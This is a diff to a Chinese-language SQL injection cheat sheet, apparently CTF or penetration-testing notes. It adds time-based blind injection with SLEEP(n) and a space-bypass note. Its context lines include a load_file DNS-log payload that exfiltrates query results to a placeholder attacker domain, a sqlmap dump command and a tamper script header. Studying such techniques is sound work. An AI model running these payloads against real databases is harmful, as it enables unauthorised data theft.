@@ -279,6 +279,11 @@ thr5.start()
 thr6.start()
 thr7.start()
 ```
+  * 时间盲注
+
+    和布尔盲注类似，不过因为没有回显，采用网页响应时间来判定数据
+    利用``SLEEP(n)``
+
   * 修改 ``||``(或)运算符为字符串连接符
     ``set sql_mode=PIPES_AS_CONCAT;`` 
   
@@ -302,9 +307,12 @@ thr7.start()
     ```
     select load_file(concat('\\\\', (<sqli>), '.your-dnslog.com'));
     ```
-## 空格绕过
-
-mysql查询的时候将会忽略字符串尾部的空格
+  * 空格绕过
+    
+    mysql查询的时候将会忽略字符串尾部的空格
+  
+  * 格式化字符串逃逸
+    https://zhuanlan.zhihu.com/p/115777073 
 
 ## 关于Sqlite
 
@@ -381,7 +389,7 @@ sqlmap -u url --dump --start=1 --stop=3 -C字段 -T 表段 -D 数据库 //猜解
 
 写一个简单的temper
 
-```
+```python
 # sqlmap/tamper/backquotes.py
  
 from lib.core.enums import PRIORITY
